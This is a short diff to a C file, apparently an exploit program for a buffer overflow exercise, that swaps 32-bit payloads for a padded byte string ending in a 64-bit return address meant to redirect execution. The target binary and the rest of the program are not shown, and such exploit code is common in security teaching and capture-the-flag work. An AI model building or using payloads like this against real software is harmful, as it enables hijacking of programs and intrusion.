@@ -9,14 +9,8 @@
 #include <stdlib.h>
 #include <unistd.h>
 
-
-/* FIXME */
-// unsigned char payload[] =
-// 	"XXXXXXXXXXXXXXXXXXXXXXXXXXXX\x4f\x92\x98\x0a";
-// unsigned char payload[] =
-// 	"XXXXXXXXXXXXXXXXXXXXXXXXXXXX\xbf\x91\x98\x0aXXXX\xef\xbe\xad\xde";	
 unsigned char payload[] =
-	"XXXXXXXXXXXXXXXXXXXXXXXXXXXX\x16\x91\x98\x0aXXXX\x70\x94\x98\x0a";
+	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXrrrrrrrr\x46\x11\x40\x00\x00\x00\x00\x00";
 
 int
 main(int argc, char **argv)
